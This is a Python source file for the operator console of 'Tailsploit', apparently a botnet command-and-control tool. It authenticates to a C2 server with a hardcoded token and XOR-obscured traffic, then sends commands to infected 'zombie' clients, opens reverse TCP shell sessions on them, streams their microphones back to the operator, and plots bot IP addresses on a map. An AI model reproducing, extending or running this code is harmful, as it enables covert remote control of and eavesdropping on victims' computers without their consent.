import socket
from colorama import Back, Style, Fore
import time
import sys
from pyspin.spin import Box1, Spinner
import os
import threading
import pyaudio
import datetime
import folium
import requests
import keyboard

# Set up audio capture
CHUNK_SIZE = 2048
FORMAT = pyaudio.paInt16
CHANNELS = 1
RATE = 44100
stream = None
is_playing_audio = False
audio = pyaudio.PyAudio()


class AdminShell:
    def __init__(self):
        self.SERVER_IP = "127.0.0.1"
        self.SERVER_PORT = 5050
        self.isAuthenticated = False
        self.MAC_ADDR = "TAILSPLOIT?TOKEN=cvdApAWauV9N2Dd2jEsiziDILgi2sVd3t98RDeiWaswLLVeglbTVIRV3YokmAsBm"
        self.TIMEOUT_COMMAND = 5
        self.ADMIN_DISPLAY_NAME = ""
        self.TARGET_CLIENT = False
        self.TARGET_CLIENT_INFO = ""
        self.TRAFFIC_ENCRYPTION_TOKEN = b"AUTHORIZED?BOTNET=ENCRYPTIONTYPE?XOR"
        self.audio_playback_executed = (
            False  # Flag to track if audio playback has been executed
        )
        self.audio_thread = None
        self.stop_audio_thread = (
            threading.Event()
        )  # Create an Event to signal thread termination
        self.audio_lock = threading.Lock()
        self.chat_mode = False
        self.chat_channel = None
        self.chat_thread = None  # Store the reference to the chat thread
        self.exit_chat_flag = False

    def initializeServerConnection(self):
        try:
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print(
                f"""

                ///

        github/{Fore.RED}devmalcolm{Style.RESET_ALL}
    """
            )
            spin = Spinner(Box1)
            for i in range(1):
                print(
                    "\r            {0} Requesting authentication...".format(
                        spin.next()
                    ),
                    end="",
                )
                sys.stdout.flush()
                time.sleep(0.1)
            print("")
            print("")
            print("")
            AdminShellUsername = input("> Session username : ")
            self.ADMIN_DISPLAY_NAME = AdminShellUsername
            AdminShellSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            AdminShellSocket.connect((self.SERVER_IP, self.SERVER_PORT))
            TokenChecking = self.handleXOREncryption(
                self.MAC_ADDR.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN
            )
            AdminShellSocket.send(TokenChecking)
            OnAuthenticationResultXOR = AdminShellSocket.recv(4096)
            OnAuthenticationResult = self.handleXOREncryption(
                OnAuthenticationResultXOR, self.TRAFFIC_ENCRYPTION_TOKEN
            ).decode("utf-8")
            self.OnAuthenticationChecking(OnAuthenticationResult, AdminShellSocket)

        except KeyboardInterrupt:  
            CurrentTimeSession = datetime.datetime.now()
            FormattedTimeSession = CurrentTimeSession.strftime("%a %b %d %H:%M:%S %Y")
            print("")
            print(f'\n{Fore.RED}[*]{Style.RESET_ALL} Closing the active Tailsploit session...\n{Fore.RED}[*]{Style.RESET_ALL} Logout at {FormattedTimeSession}')
        except Exception as e:
            if os.name == "nt":
                os.system("cls")
            else:
                os.system("clear")
            print("")
            print(f"""Error: The server is not {Fore.RED}reachable{Style.RESET_ALL} due to one of the following reasons:

- You have been kicked or banned from the server.
- Your access token has been revoked.
- Your session has expired.
- The server is currently shut down.

Please check your status or contact the server administrator for further informations.
""")

    def handleXOREncryption(self, content_data, key_traffic):
        key_traffic = (
            key_traffic * (len(content_data) // len(key_traffic))
            + key_traffic[: len(content_data) % len(key_traffic)]
        )
        return bytes(
            [byte ^ key_byte for byte, key_byte in zip(content_data, key_traffic)]
        )

    def OnAuthenticationChecking(self, OnAuthenticationResult, AdminShellSocket):
        if (
            OnAuthenticationResult
            == f"--FLAG_TAILSPLOIT_AUTHENTICATION?AUTHORIZED={self.MAC_ADDR}"
        ):
            print("")
            print(
                f"{Fore.GREEN}[*]{Style.RESET_ALL} Provided authentication token is active, status : {Back.GREEN} AUTHENTICATED {Style.RESET_ALL}"
            )
            time.sleep(2)
            self.isAuthenticated = True
            self.OnAuthenticationMFA(AdminShellSocket)
        elif OnAuthenticationResult == "--FLAG_PROVIDED_TOKEN_ALREADY_IN_USE":
            print(f"{Fore.RED}[-]{Style.RESET_ALL} The provided token is already in use, please use another one")
            self.isAuthenticated = False
        elif OnAuthenticationResult == "--FLAG_PROVIDED_TOKEN_NOT_VALID":
            print(f"{Fore.RED}[-]{Style.RESET_ALL} The provided token not valid, please use another one.")
            self.isAuthenticated = False
        elif OnAuthenticationResult == "--FLAG_PROVIDED_TOKEN_REVOKED":
            print(f"{Fore.RED}[-]{Style.RESET_ALL} The provided token has been revoked.")
            self.isAuthenticated = False
        else:
            self.isAuthenticated = False
            print(f"{Fore.RED}[-]{Style.RESET_ALL} An error occured while checking your authentication token.")
        
    def OnAuthenticationMFA(self, AdminShellSocket):
        OnAuthenticationMFAStatusXOR = AdminShellSocket.recv(1024)
        OnAuthenticationMFAStatus = self.handleXOREncryption(
            OnAuthenticationMFAStatusXOR, self.TRAFFIC_ENCRYPTION_TOKEN
        ).decode("utf-8")

        if "--FLAG_MFA_REQUIRED" in OnAuthenticationMFAStatus:
            while True:
                print("")
                AdminMFACode = input("> Multi-Factor Authentication (MFA) Code : ")
                AdminMFACodeXOR = self.handleXOREncryption(AdminMFACode.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
                AdminShellSocket.send(AdminMFACodeXOR)
                OnAuthenticationMFAStatusAwaiting = AdminShellSocket.recv(1024)
                OnAuthenticationMFAStatusAwaitingXOR = self.handleXOREncryption(
                    OnAuthenticationMFAStatusAwaiting, self.TRAFFIC_ENCRYPTION_TOKEN
                ).decode("utf-8")

                if OnAuthenticationMFAStatusAwaitingXOR == "--FLAG_MFA_STATUS=200":
                    print("")
                    print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Initiating the connection...")
                    print("")
                    time.sleep(2)
                    self.adminShellSession(AdminShellSocket)
                    break
                elif OnAuthenticationMFAStatusAwaitingXOR == "--FLAG_MFA_STATUS=404":
                    print("")
                    print(f"{Fore.RED}[-]{Style.RESET_ALL} The MFA code provided is incorrect. Please verify and try again")
                    time.sleep(5)
                    continue
            
        elif "--FLAG_MFA_NOT_REQUIRED":
            print("NOT REQUIRED")
            self.adminShellSession(AdminShellSocket)
        else:
            print("[*] An error occured")
        
        print(OnAuthenticationMFAStatus)

    def play_audio(self, AdminShellSocket):
        global stream

        while not self.stop_audio_thread.is_set():
            try:
                audio_chunk = AdminShellSocket.recv(4096)
                if audio_chunk.startswith(b"AUD:"):
                    audio_data = audio_chunk[4:]

                    if not stream:
                        stream = audio.open(
                            format=FORMAT,
                            channels=CHANNELS,
                            rate=RATE,
                            output=True,
                            frames_per_buffer=CHUNK_SIZE,
                        )

                    if not audio_data:
                        break  # Audio playback finished, exit the loop

                    stream.write(audio_data)

            except socket.timeout:
                print("Disconnected client due to timeout")
                break  # Handle timeout and exit the loop
            except Exception as e:
                print(f"Error in audio playback: {e}")
                break  # Handle other exceptions and exit the loop

    def start_audio_playback_thread(self, AdminShellSocket):
        if self.audio_thread is None:
            self.stop_audio_thread.clear()  # Clear the stop signal
            self.audio_thread = threading.Thread(
                target=self.play_audio,
                args=(AdminShellSocket,),
                name="Audio Tailsploit Thread",
            )
            self.audio_thread.start()

    def stop_audio_playback_thread(self):
        if self.audio_thread is not None:
            self.stop_audio_thread.set()  # Set the stop signal
            self.audio_thread.join()  # Wait for the thread to finish
            self.stop_audio_thread.clear()  # Clear the stop signal
            self.audio_thread = None  # Reset the thread variable

    def exit_chat(self):
        if self.chat_thread:
            self.exit_chat_flag = True 
            self.chat_mode = False
            try:
                self.chat_thread.join(timeout=5) 
            except Exception as e:
                print(e)
            if self.chat_thread.is_alive():
                print("Chat thread did not terminate in time. Continuing without joining.")
            else:
                print("")
                print(f"{Fore.RED}[*]{Style.RESET_ALL} Exiting chat session...")
                print("")
            self.chat_thread = None


    def __del__(self):
        self.exit_chat()

    def adminShellSession(self, AdminShellSocket):
        if os.name == "nt":
            os.system("cls")
        else:
            os.system("clear")

        SendUsernameXOR = self.handleXOREncryption(
            self.ADMIN_DISPLAY_NAME.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN
        )
        AdminShellSocket.send(SendUsernameXOR)
        OnUsernameVerification = AdminShellSocket.recv(1024)
        OnUsernameVerificationResult = self.handleXOREncryption(
            OnUsernameVerification, self.TRAFFIC_ENCRYPTION_TOKEN
        ).decode("utf-8")
        if OnUsernameVerificationResult == "--FLAG_USERNAME_ALREADY_CHOSEN":
            print("Username Already Chosen")
            time.sleep(0.5)
            sys.exit(1)
        elif OnUsernameVerificationResult == "--FLAG_USERNAME_AVAILABLE":
            pass
        else:
            pass

        CurrentTimeSession = datetime.datetime.now()
        FormattedTimeSession = CurrentTimeSession.strftime("%a %b %d %H:%M:%S %Y")

        print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Login as: \x1B[4m{self.ADMIN_DISPLAY_NAME}\x1B[0m")
        print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Session started at {FormattedTimeSession}")
        print("")
        while self.isAuthenticated:
            if self.chat_mode:
                #self.receive_messages(AdminShellSocket)
                self.current_input = ""
                message = input("> ")
                if message == "/exitchat":
                    self.exit_chat()
                    continue
                elif message == "":
                    print("\033[F\033[K", end="")
                    continue
                else:
                    self.send_chat_message(message, AdminShellSocket)
                    print("\033[F\033[K", end="")
                    self.current_input = message
                    continue

            else:
                if self.TARGET_CLIENT:
                    adminShell = input(
                        f"\x1B[4mtailsploit\x1B[0m ~ {Fore.RED}({REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.RED}{REVERSE_SHELL_PORT}){Style.RESET_ALL} > "
                    )
                else:
                    adminShell = input(
                        f"\x1B[4mtailsploit\x1B[0m > "
                    )
            if adminShell == "":
                continue
            elif adminShell == "clear":
                if os.name == "nt":
                    os.system("cls")
                else:
                    os.system("clear")
                continue
            elif adminShell == "thread":
                active_threads = threading.enumerate()
                print("Active Threads:")
                for thread in active_threads:
                    print("- Thread Name:", thread.name)
                continue

            elif adminShell == "enterchat":
                self.chat_mode = True
                self.exit_chat_flag = False  # Clear the exit flag
                self.chat_thread = threading.Thread(target=self.receive_messages, args=(AdminShellSocket,))
                #self.chat_thread.daemon = True
                self.chat_thread.start()
                if os.name == "nt":
                    os.system("cls")
                else:
                    os.system("clear")

                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Started Administrator Chat Mode Session.")
                print(f"{Fore.GREEN}[*]{Style.RESET_ALL} Chat Encryption Type : XOR (Low-Level)")
                print("\n")
                continue
            else:
                if self.TARGET_CLIENT:
                    formatTargetMessage = f"{adminShell} --FLAG_REVERSE_SHELL_INFO {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}"
                    formatTargetMessageXOR = self.handleXOREncryption(
                        formatTargetMessage.encode("utf-8"),
                        self.TRAFFIC_ENCRYPTION_TOKEN,
                    )
                    AdminShellSocket.send(formatTargetMessageXOR)
                else:
                    adminShellXOR = self.handleXOREncryption(
                        adminShell.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN
                    )
                    AdminShellSocket.send(adminShellXOR)
            while True:
                try:
                    ServerShellXOR = AdminShellSocket.recv(1024)
                    if ServerShellXOR.startswith(b"AUD:"):
                        pass
                    else:
                        ServerShell = self.handleXOREncryption(
                            ServerShellXOR, self.TRAFFIC_ENCRYPTION_TOKEN
                        ).decode("utf-8")

                        if (
                            "--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?CONNECTED"
                            in ServerShell
                        ):
                            client_info, flag = ServerShell.split(
                                " --FLAG_REVERSE_SELL "
                            )
                            REVERSE_SHELL_IP, REVERSE_SHELL_PORT = client_info.split(
                                ":"
                            )
                            print(
                                f"Connected to: {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}"
                            )
                            self.TARGET_CLIENT = True
                            self.TARGET_CLIENT_INFO = (
                                f"{REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}"
                            )
                            if os.name == "nt":  # Windows
                                os.system("cls")
                            else:
                                os.system("clear")
                            CurrentTimeSession = datetime.datetime.now()
                            FormattedTimeSession = CurrentTimeSession.strftime("%a %b %d %H:%M:%S %Y")
                            print("")
                            print(
                                f"{Fore.GREEN}[*]{Style.RESET_ALL} Started Reverse Shell (TCP) Session Handler On {Fore.GREEN}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.GREEN}{REVERSE_SHELL_PORT}{Style.RESET_ALL}"
                            )
                            print(f"{Fore.GREEN}[*]{Style.RESET_ALL} TCP Session Started At {FormattedTimeSession}")
                            print("")
                            break
                        elif "--FLAG_KILL_SESSION_REVERSE_TCP_SUCCESS" in ServerShell:
                            self.TARGET_CLIENT = False
                            print("")
                            print(
                                f"{Fore.RED}[*]{Style.RESET_ALL} Closing Reverse TCP Shell Session ({Fore.YELLOW}{REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}{Style.RESET_ALL})..."
                            )
                            print("")
                            break
                        elif "--FLAG_AUDIO_STREAMING_STARTED" in ServerShell:
                            print("")
                            print(
                                f"[{Fore.YELLOW}*{Style.RESET_ALL}] Initializing audio streaming to target..."
                            )
                            if (
                                self.audio_thread is None
                                or not self.audio_thread.is_alive()
                            ):
                                print(
                                    f"[{Fore.GREEN}*{Style.RESET_ALL}] You are listening to {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT} microphone."
                                )
                                print(f"Type 'stoplisten' to close the audio stream.")
                                print("")
                                self.start_audio_playback_thread(AdminShellSocket)
                            else:
                                print(
                                    f"[{Fore.RED}*{Style.RESET_ALL}] Microphone is already being listened to."
                                )
                            break
                        elif "--FLAG_AUDIO_STREAMING_STOPPED" in ServerShell:
                            print("\n")
                            print(
                                f"[{Fore.YELLOW}*{Style.RESET_ALL}] Stopping microphone listening..."
                            )
                            if (
                                self.audio_thread is not None
                                and self.audio_thread.is_alive()
                            ):
                                print(
                                    f"[{Fore.RED}*{Style.RESET_ALL}] Audio stream closed."
                                )
                                print("\n")
                                self.stop_audio_playback_thread()
                                print("test")
                                break
                            else:
                                print("Microphone is not being listened to.")
                            break
                        elif "--FLAG_LOGOUT_FROM_SERVER" in ServerShell:
                            CurrentTimeSession = datetime.datetime.now()
                            FormattedTimeSession = CurrentTimeSession.strftime("%a %b %d %H:%M:%S %Y")
                            raise Exception(f'\n{Fore.RED}[*]{Style.RESET_ALL} Closing the active Tailsploit session...\n{Fore.RED}[*]{Style.RESET_ALL} Logout at {FormattedTimeSession}')
                            
                        elif "--FLAG_KICKED_FROM_SERVER" in ServerShell:
                            raise Exception(f'\n{Fore.RED}[*]{Style.RESET_ALL} You have been kicked from the server by a server administrator.')

                        elif (
                            "--FLAG_REVERSE_SELL REVERSE_SHELL_HANDLER_STATUS?NOTFOUND"
                            in ServerShell
                        ):
                            print("")
                            print(
                                f"{Fore.RED}[-]{Style.RESET_ALL} Cannot start a Reverse TCP Shell with this client/zombie session, please try again."
                            )
                            print("")
                            break
                        elif "--FLAG_MESSAGE_MODE_ADMN_FORWARDED" in ServerShell:
                            continue
                        elif (
                            "--FLAG_REVERSE_SHELL_INFO REVERSE_SHELL_HANDLER_STATUS?STOPPED"
                            in ServerShell
                        ):
                            print("")
                            print(
                                f"[{Fore.RED}*{Style.RESET_ALL}] Stopping Reverse Shell (TCP) Handler Server. ({Fore.YELLOW}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.YELLOW}{REVERSE_SHELL_PORT}{Style.RESET_ALL})"
                            )
                            print("")
                            self.TARGET_CLIENT = None
                            self.TARGET_CLIENT_INFO = ""
                            break
                        elif "--FLAG_TAILSPLOIT_CONN_CLIENT_MAP" in ServerShell:
                            ip_list_str = ServerShell.split(":")[1].strip()
                            print(ip_list_str)
                            valid_ips = [ip.strip(" '") for ip in ip_list_str[1:-1].split(",")]

                            IPS = []

                            IPS.append(valid_ips)

                            print(IPS)
                        
                            try:
                                m = folium.Map(
                                    location=[0, 0],
                                    tiles=None,
                                    zoom_start=2,
                                )

                                folium.TileLayer(
                                    tiles="https://{s}.basemaps.cartocdn.com/rastertiles/dark_all/{z}/{x}/{y}.png",
                                    attr='&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors &copy; <a href="https://carto.com/attributions">CARTO</a>',
                                    max_zoom=25,
                                    name="cartodbdark_matter",
                                    control=False,
                                ).add_to(m)

                                for ip in valid_ips:
                                    print(ip)
                                    response = requests.get(
                                        f"https://ipinfo.io/{ip}/json"
                                    )
                                    data = response.json()

                                    lat, lon = data["loc"].split(",")

                                    popup_content = f"""
                                            <div style="width: 200px;">
                                                <strong>Bot IP Address:</strong> {ip}<br>
                                                <strong>OS:</strong> Windows 11<br>
                                                <strong>Desktop Name:</strong> Malcolm
                                            </div>
                                        """
                                    folium.CircleMarker(
                                        location=[float(lat), float(lon)],
                                        radius=6,
                                        color="#FF6B6B",
                                        fill=True,
                                        fill_color="#FF6B6B",
                                        fill_opacity=0.5,
                                        popup=folium.Popup(html=popup_content),
                                        tooltip=f"Bot IP Address: {ip}",
                                    ).add_to(m)
                                    folium.LayerControl().add_to(m)
                                    m.save("/tmp/tailsploit-bot-ipmap-layer.html")
                            except Exception as e:
                                print(e)
                                break
                                print(f"{Fore.RED}[-]{Style.RESET} An error occured while generating connection node map. (Localhost IPs are not supported)")
                                print("")
                                break

                        elif ServerShell:
                            print("")
                            print(ServerShell)
                            print("")
                            break
                except Exception as e:
                    print(e)
                    sys.exit(1)
                except KeyboardInterrupt:
                    print("[INFO] Admin terminated the connection.")
                    AdminShellSocket.close()

    def receive_messages(self, AdminShellSocket):
        AdminShellSocket.setblocking(False)  # Set socket to non-blocking mode
        while not self.exit_chat_flag:
            try:
                message = AdminShellSocket.recv(1024)
                if not message:
                    break  # No data received, break the loop
                messageDecoded = self.handleXOREncryption(message, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                
                if "--FLAG_MESSAGE_MODE_ADMN_FORWARDED" in messageDecoded:
                    message_content = messageDecoded.replace("--FLAG_MESSAGE_MODE_ADMN_FORWARDED", "").strip()
                    current_time = datetime.datetime.now()
                    formatted_time = current_time.strftime("%H:%M:%S")

                    if message_content:
                        print("\033[F\033[K" + formatted_time + f" - {message_content}", end="\n\n")
                        keyboard.press_and_release('enter')
                else:
                    pass
            except BlockingIOError:
                pass  # No data available, continue loop
        AdminShellSocket.setblocking(True)  # Set socket back to blocking mode



    def send_chat_message(self, message, AdminShellSocket):
        formatted_message = f"--FLAG_MESSAGE_MODE_ADMN {message}"
        encrypted_message = self.handleXOREncryption(formatted_message.encode("utf-8"), self.TRAFFIC_ENCRYPTION_TOKEN)
        AdminShellSocket.send(encrypted_message)



if __name__ == "__main__":
    x = AdminShell()
    x.initializeServerConnection()
